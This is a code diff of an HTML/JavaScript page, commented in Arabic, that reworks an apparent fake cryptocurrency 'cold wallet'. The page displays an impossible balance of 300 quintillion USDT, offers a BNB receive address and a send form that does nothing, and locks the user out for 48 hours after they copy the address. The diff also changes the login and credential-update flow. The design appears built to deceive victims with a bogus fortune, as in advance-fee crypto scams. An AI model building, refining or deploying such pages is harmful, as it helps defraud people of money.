@@ -1,4 +1,4 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -15,7 +15,7 @@
       justify-content: center;
       align-items: center;
     }
-    .login-box, .update-box {
+    .login-box, .update-box, .wallet-box, .lock-box {
       background: rgba(20, 30, 40, 0.95);
       padding: 40px;
       border-radius: 10px;
@@ -24,7 +24,7 @@
       max-width: 350px;
       text-align: center;
     }
-    .login-box h2, .update-box h2 {
+    .login-box h2, .update-box h2, .wallet-box h2 {
       color: #4fc3f7;
       margin-bottom: 25px;
     }
@@ -100,17 +100,7 @@
       padding: 20px; border-radius: 6px; text-align: center; color: #f44336;
     }
 
-    /* ===== Wallet & Modals styles (new) ===== */
-    .wallet-box, .lock-box {
-      background: rgba(20, 30, 40, 0.95);
-      padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-      width: 100%;
-      max-width: 350px;
-      text-align: center;
-      margin: 20px auto;
-    }
+    /* ===== Wallet & Modals styles ===== */
     .wallet-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:25px; }
     .logout-btn {
       background: rgba(244,67,54,0.2);
@@ -142,7 +132,6 @@
       background: rgba(0,0,0,0.8);
       display: flex; justify-content: center; align-items: center; z-index: 1000;
     }
-    .receive-modal.hidden, .send-modal.hidden { display:none; }
     .modal-content {
       background: rgba(20, 30, 40, 0.98);
       padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center;
@@ -235,8 +224,51 @@
     </form>
   </div>
 
+  <!-- صفحة المحفظة -->
+  <div class="wallet-box hidden" id="walletPage">
+    <div class="wallet-header">
+      <h2><i class="fas fa-wallet"></i> Wallet</h2>
+      <button class="logout-btn" id="logoutBtn">Logout</button>
+    </div>
+
+    <div class="balance-card">
+      <h3 style="color:#b3e5fc;">Total Balance</h3>
+      <div class="balance-amount">300,000,000,000,264,400</div>
+      <div class="balance-details">USDT (Visible Value)</div>
+    </div>
+
+    <table class="assets-table">
+      <tr>
+        <th>Token</th>
+        <th>Network</th>
+        <th>Contract</th>
+      </tr>
+      <tr>
+        <td><i class="fab fa-btc"></i> BNB</td>
+        <td>Binance Smart Chain</td>
+        <td>-</td>
+      </tr>
+      <tr>
+        <td><i class="fas fa-coins"></i> TELLER</td>
+        <td>BSC</td>
+        <td><small>0x4953d28b12D862250Cc96163A9C46Ae2B8ef52c5</small></td>
+      </tr>
+    </table>
+
+    <div class="action-buttons">
+      <button class="action-btn" id="sendBtn">
+        <i class="fas fa-paper-plane"></i>
+        <span>Send</span>
+      </button>
+      <button class="action-btn" id="receiveBtn">
+        <i class="fas fa-download"></i>
+        <span>Receive</span>
+      </button>
+    </div>
+  </div>
+
   <!-- صفحة الحظر -->
-  <div class="login-box hidden" id="lockPage">
+  <div class="lock-box hidden" id="lockPage">
     <div class="lock-message">
       <i class="fas fa-lock fa-3x"></i>
       <h2>System Temporarily Locked</h2>
@@ -247,7 +279,31 @@
     </div>
   </div>
 
-  <!-- ===== Original Script (unchanged logic) ===== -->
+  <!-- Receive Modal -->
+  <div class="receive-modal hidden" id="receiveModal">
+    <div class="modal-content">
+      <h3><i class="fas fa-qrcode"></i> Receive BNB</h3>
+      <div class="address-box" id="bnbAddress">0x59f1124D678dF8DB052F62f50473AEEdB5DDd365</div>
+      <button class="copy-btn" id="copyAddressBtn">Copy Address</button>
+      <button class="close-btn" id="closeReceiveBtn">Close</button>
+    </div>
+  </div>
+
+  <!-- Send Modal -->
+  <div class="send-modal hidden" id="sendModal">
+    <div class="modal-content">
+      <h3><i class="fas fa-paper-plane"></i> Send Tokens</h3>
+      <form id="sendForm">
+        <input type="text" id="recipientAddress" placeholder="Recipient Address" required
+               style="width:100%;padding:10px;margin:10px 0;border-radius:6px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.1);color:#fff;">
+        <input type="number" id="sendAmount" placeholder="Amount" required
+               style="width:100%;padding:10px;margin:10px 0;border-radius:6px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.1);color:#fff;">
+        <button type="submit" class="copy-btn">Transfer</button>
+        <button type="button" id="closeSendBtn" class="close-btn">Cancel</button>
+      </form>
+    </div>
+  </div>
+
   <script>
     // معلومات الدخول السرية (مشفرة)
     const encryptedCredentials = {
@@ -267,6 +323,7 @@
     // عناصر DOM
     const loginPage = document.getElementById('loginPage');
     const updatePage = document.getElementById('updatePage');
+    const walletPage = document.getElementById('walletPage');
     const lockPage  = document.getElementById('lockPage');
     const loginForm = document.getElementById('loginForm');
     const updateForm = document.getElementById('updateForm');
@@ -275,6 +332,18 @@
     const updateConfirmPassword = document.getElementById('updateConfirmPassword');
     const secretKeyElement = document.getElementById('secretKey');
     const lockTimerElement = document.getElementById('lockTimer');
+
+    // مراجع عناصر المحفظة/المودالات
+    const receiveModal = document.getElementById('receiveModal');
+    const sendModal = document.getElementById('sendModal');
+    const receiveBtn = document.getElementById('receiveBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    const closeReceiveBtn = document.getElementById('closeReceiveBtn');
+    const closeSendBtn = document.getElementById('closeSendBtn');
+    const copyAddressBtn = document.getElementById('copyAddressBtn');
+    const bnbAddress = document.getElementById('bnbAddress');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const sendForm = document.getElementById('sendForm');
 
     // التحقق من حالة الحظر
     function checkLockStatus() {
@@ -323,7 +392,27 @@
       passwordError.style.display = (updatePassword.value !== updateConfirmPassword.value) ? 'block' : 'none';
     });
 
-    // معالجة تسجيل الدخول
+    // ===== التصحيح الرئيسي: التحقق من بيانات المستخدم المسجلة =====
+    function checkUserCredentials(username, password, twoFACode) {
+      // أولاً: التحقق من المعلومات الافتراضية
+      const decryptedUsername = decrypt(encryptedCredentials.username);
+      const decryptedPassword = decrypt(encryptedCredentials.password);
+      const decryptedTwoFA = decrypt(encryptedCredentials.twoFA);
+      
+      if (username === decryptedUsername && password === decryptedPassword && twoFACode === decryptedTwoFA) {
+        return { success: true, isDefault: true };
+      }
+      
+      // ثانياً: التحقق من المستخدمين المسجلين
+      if (users[username] && users[username].password === password) {
+        // هنا يمكن إضافة التحقق من 2FA إذا كان موجوداً
+        return { success: true, isDefault: false, userData: users[username] };
+      }
+      
+      return { success: false };
+    }
+
+    // معالجة تسجيل الدخول - معدلة
     loginForm.addEventListener('submit', function(e) {
       e.preventDefault();
       if (checkLockStatus()) {
@@ -331,59 +420,114 @@
         lockPage.classList.remove('hidden');
         return;
       }
+      
       const username = document.getElementById('loginUsername').value;
       const password = document.getElementById('loginPassword').value;
       const twoFACode = document.getElementById('login2FA').value;
 
-      const decryptedUsername = decrypt(encryptedCredentials.username);
-      const decryptedPassword = decrypt(encryptedCredentials.password);
-      const decryptedTwoFA    = decrypt(encryptedCredentials.twoFA);
+      const authResult = checkUserCredentials(username, password, twoFACode);
       
-      if (username === decryptedUsername && password === decryptedPassword && twoFACode === decryptedTwoFA) {
-        logSecurityEvent('Initial login with default credentials');
-        loginPage.classList.add('hidden');
-        updatePage.classList.remove('hidden');
-        const secret = generateGoogleAuthSecret();
-        secretKeyElement.textContent = secret;
+      if (authResult.success) {
+        if (authResult.isDefault) {
+          // الدخول بالمعلومات الافتراضية - يذهب لتحديث المعلومات
+          logSecurityEvent('Initial login with default credentials');
+          loginPage.classList.add('hidden');
+          updatePage.classList.remove('hidden');
+          const secret = generateGoogleAuthSecret();
+          secretKeyElement.textContent = secret;
+        } else {
+          // الدخول بالمعلومات المسجلة - يذهب مباشرة للمحفظة
+          logSecurityEvent('Successful login with registered credentials');
+          loginPage.classList.add('hidden');
+          walletPage.classList.remove('hidden');
+        }
       } else {
         alert('Invalid credentials. Please check your username, password and 2FA code.');
         logSecurityEvent('Failed login attempt');
       }
     });
 
-    // معالجة تحديث المعلومات (الأصلي: يفعّل القفل ويذهب لصفحة الحظر)
+    // معالجة تحديث المعلومات - معدلة
     updateForm.addEventListener('submit', function(e) {
       e.preventDefault();
       if (updatePassword.value !== updateConfirmPassword.value) {
         alert('Passwords do not match. Please try again.');
         return;
       }
+      
       const newUsername = document.getElementById('updateUsername').value;
       const newPassword = document.getElementById('updatePassword').value;
       const securityQuestion = document.getElementById('securityQuestion').value;
       const securityAnswer = document.getElementById('securityAnswer').value;
       const gauthCode = document.getElementById('gauthCode').value;
+      
       if (!verifyGoogleAuthCode(gauthCode)) {
         alert('Invalid Google Authenticator code. Please enter a valid 6-digit code.');
         return;
       }
+      
+      // حفظ البيانات الجديدة
       users[newUsername] = {
-        password: newPassword, securityQuestion, securityAnswer,
-        gauthSecret: secretKeyElement.textContent, lastUpdate: new Date().toISOString()
+        password: newPassword,
+        securityQuestion: securityQuestion,
+        securityAnswer: securityAnswer,
+        gauthSecret: secretKeyElement.textContent,
+        lastUpdate: new Date().toISOString()
       };
+      
       localStorage.setItem('coldWalletUsers', JSON.stringify(users));
+      logSecurityEvent('Security credentials updated successfully');
 
-      localStorage.setItem('lastSecurityChange', Date.now());
-      logSecurityEvent('Security credentials updated - system locked for 48 hours');
-
+      // الانتقال مباشرة إلى المحفظة بعد التحديث
       updatePage.classList.add('hidden');
-      lockPage.classList.remove('hidden');
-      updateLockTimer();
+      walletPage.classList.remove('hidden');
+    });
+
+    // ===== وظائف المحفظة =====
+    receiveBtn.addEventListener('click', function() {
+      receiveModal.classList.remove('hidden');
+    });
+
+    copyAddressBtn.addEventListener('click', function() {
+      navigator.clipboard.writeText(bnbAddress.textContent.trim());
+      alert('BNB Address copied to clipboard.');
+      
+      // بعد نسخ العنوان، يحظر النظام لمدة 48 ساعة
+      setTimeout(() => {
+        localStorage.setItem('lastSecurityChange', Date.now());
+        walletPage.classList.add('hidden');
+        lockPage.classList.remove('hidden');
+        updateLockTimer();
+      }, 3000);
+    });
+
+    closeReceiveBtn.addEventListener('click', function() {
+      receiveModal.classList.add('hidden');
+    });
+
+    sendBtn.addEventListener('click', function() {
+      sendModal.classList.remove('hidden');
+    });
+
+    closeSendBtn.addEventListener('click', function() {
+      sendModal.classList.add('hidden');
+    });
+
+    sendForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('Transfer request sent.');
+      sendModal.classList.add('hidden');
+    });
+
+    logoutBtn.addEventListener('click', function() {
+      walletPage.classList.add('hidden');
+      loginPage.classList.remove('hidden');
+      loginForm.reset();
     });
 
     // تحديث عداد الحظر
     function updateLockTimer() {
-      if (checkLockStatus()) setTimeout(updateLockTimer, 60000); // تحديث كل دقيقة
+      if (checkLockStatus()) setTimeout(updateLockTimer, 60000);
     }
 
     // التحقق الأولي من الحظر
@@ -402,166 +546,6 @@
         e.preventDefault();
       }
     });
-  </script>
-
-  <!-- ===== Auto-restore wallet_backup.json (added) ===== -->
-  <script>
-    (async () => {
-      try {
-        // يحاول قراءة wallet_backup.json من نفس المجلد بدون كاش
-        const res = await fetch('wallet_backup.json', { cache: 'no-store' });
-        if (!res.ok) return; // الملف غير موجود — تجاهل بهدوء
-
-        const data = await res.json();
-        if (data && typeof data === 'object' && data.coldWalletUsers && typeof data.coldWalletUsers === 'object') {
-          // تخزين في localStorage
-          localStorage.setItem('coldWalletUsers', JSON.stringify(data.coldWalletUsers));
-          if (data.securityLog)        localStorage.setItem('securityLog', JSON.stringify(data.securityLog));
-          if (data.lastSecurityChange) localStorage.setItem('lastSecurityChange', data.lastSecurityChange);
-
-          // مزامنة المتغير العالمي users إن كان مُعرّفًا
-          if (typeof users !== 'undefined') {
-            users = data.coldWalletUsers;
-          }
-          console.log('✅ Auto-restore: wallet_backup.json loaded.');
-        } else {
-          console.warn('⚠️ Auto-restore: invalid wallet_backup.json format (missing coldWalletUsers).');
-        }
-      } catch (err) {
-        console.warn('⚠️ Auto-restore failed:', err);
-      }
-    })();
-  </script>
-
-  <!-- ===== Wallet Page (new) ===== -->
-  <div class="wallet-box hidden" id="walletPage" style="display:none;">
-    <div class="wallet-header">
-      <h2><i class="fas fa-wallet"></i> Wallet</h2>
-      <button class="logout-btn" id="logoutBtn">Logout</button>
-    </div>
-
-    <div class="balance-card">
-      <h3 style="color:#b3e5fc;">Total Balance</h3>
-      <div class="balance-amount">300,000,000,000,264,400</div>
-      <div class="balance-details">USDT (Visible Value)</div>
-    </div>
-
-    <table class="assets-table">
-      <tr>
-        <th>Token</th>
-        <th>Network</th>
-        <th>Contract</th>
-      </tr>
-      <tr>
-        <td><i class="fab fa-btc"></i> BNB</td>
-        <td>Binance Smart Chain</td>
-        <td>-</td>
-      </tr>
-      <tr>
-        <td><i class="fas fa-coins"></i> TELLER</td>
-        <td>BSC</td>
-        <td><small>0x4953d28b12D862250Cc96163A9C46Ae2B8ef52c5</small></td>
-      </tr>
-    </table>
-
-    <div class="action-buttons">
-      <button class="action-btn" id="sendBtn">
-        <i class="fas fa-paper-plane"></i>
-        <span>Send</span>
-      </button>
-      <button class="action-btn" id="receiveBtn">
-        <i class="fas fa-download"></i>
-        <span>Receive</span>
-      </button>
-    </div>
-  </div>
-
-  <!-- Receive Modal -->
-  <div class="receive-modal hidden" id="receiveModal">
-    <div class="modal-content">
-      <h3><i class="fas fa-qrcode"></i> Receive BNB</h3>
-      <div class="address-box" id="bnbAddress">0x59f1124D678dF8DB052F62f50473AEEdB5DDd365</div>
-      <button class="copy-btn" id="copyAddressBtn">Copy Address</button>
-      <button class="close-btn" id="closeReceiveBtn">Close</button>
-    </div>
-  </div>
-
-  <!-- Send Modal -->
-  <div class="send-modal hidden" id="sendModal">
-    <div class="modal-content">
-      <h3><i class="fas fa-paper-plane"></i> Send Tokens</h3>
-      <form id="sendForm">
-        <input type="text" id="recipientAddress" placeholder="Recipient Address" required
-               style="width:100%;padding:10px;margin:10px 0;border-radius:6px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.1);color:#fff;">
-        <input type="number" id="sendAmount" placeholder="Amount" required
-               style="width:100%;padding:10px;margin:10px 0;border-radius:6px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.1);color:#fff;">
-        <button type="submit" class="copy-btn">Transfer</button>
-        <button type="button" id="closeSendBtn" class="close-btn">Cancel</button>
-      </form>
-    </div>
-  </div>
-
-  <!-- ===== Wallet Script (new, no conflicts) ===== -->
-  <script>
-    // مراجع عناصر المحفظة/المودالات (بدون إعادة تعريف المتغيرات الأصلية)
-    const walletPageEl   = document.getElementById('walletPage');
-    const receiveModalEl = document.getElementById('receiveModal');
-    const sendModalEl    = document.getElementById('sendModal');
-    const receiveBtnEl   = document.getElementById('receiveBtn');
-    const sendBtnEl      = document.getElementById('sendBtn');
-    const closeReceiveEl = document.getElementById('closeReceiveBtn');
-    const closeSendEl    = document.getElementById('closeSendBtn');
-    const copyAddrEl     = document.getElementById('copyAddressBtn');
-    const bnbAddrEl      = document.getElementById('bnbAddress');
-    const logoutBtnEl    = document.getElementById('logoutBtn');
-    const sendFormEl     = document.getElementById('sendForm');
-
-    // إظهار نافذة الاستقبال
-    receiveBtnEl?.addEventListener('click', function() {
-      receiveModalEl.classList.remove('hidden');
-    });
-
-    // نسخ العنوان + تفعيل القفل + إظهار صفحة الحظر + تشغيل العدّاد
-    copyAddrEl?.addEventListener('click', function() {
-      navigator.clipboard.writeText(bnbAddrEl.textContent.trim());
-      alert('BNB Address copied to clipboard.');
-      setTimeout(() => {
-        localStorage.setItem('lastSecurityChange', Date.now());
-        walletPageEl.style.display = 'none';
-        lockPage.classList.remove('hidden');
-        if (typeof updateLockTimer === 'function') updateLockTimer();
-      }, 3000);
-    });
-
-    // إغلاق نافذة الاستقبال
-    closeReceiveEl?.addEventListener('click', function() {
-      receiveModalEl.classList.add('hidden');
-    });
-
-    // إظهار نافذة الإرسال
-    sendBtnEl?.addEventListener('click', function() {
-      sendModalEl.classList.remove('hidden');
-    });
-
-    // إغلاق نافذة الإرسال
-    closeSendEl?.addEventListener('click', function() {
-      sendModalEl.classList.add('hidden');
-    });
-
-    // إرسال الرصيد (واجهة فقط)
-    sendFormEl?.addEventListener('submit', function(e) {
-      e.preventDefault();
-      alert('Transfer request sent.');
-      sendModalEl.classList.add('hidden');
-    });
-
-    // تسجيل الخروج (واجهة فقط)
-    logoutBtnEl?.addEventListener('click', function() {
-      walletPageEl.style.display = 'none';
-      loginPage.classList.remove('hidden');
-    });
-
-    // ملاحظة: لا نغيّر تدفّق التحديث الأمني الأصلي.
   </script>
 </body>
 </html>
